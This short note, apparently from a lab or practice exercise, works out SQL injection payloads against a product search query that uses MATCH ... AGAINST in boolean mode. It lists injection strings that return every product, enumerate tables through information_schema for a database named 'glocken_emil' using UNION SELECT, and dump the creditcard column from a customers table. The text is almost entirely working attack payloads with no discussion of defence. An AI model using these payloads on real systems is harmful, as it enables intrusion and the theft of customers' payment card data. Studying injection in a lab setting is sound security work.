Assumption: to show the products in product search the following query is used

SELECT * FROM product WHERE match(name) against('our query '  IN BOOLEAN MODE) ;

Query wich shows all products
'IN BOOLEAN MODE) OR ''=''  OR match(name) against('

'IN BOOLEAN MODE) OR ''='' UNION SELECT 1,1,1,1,1 FROM users WHERE 1=1 OR match(name) against('



We remembered, that you can comment the rest with # which made the queries a bit easier:

How the tables are called
') OR 1=1 UNION SELECT table_name,1,1,1,1 FROM information_schema.tables WHERE table_schema='glocken_emil'#

How tables from colums is called:
') OR 1=1 UNION SELECT table_name,1,1,1,1 FROM information_schema.tables #

Showing all credit cards:

') OR 1=1 UNION SELECT creditcard,1,1,1,1 FROM customers #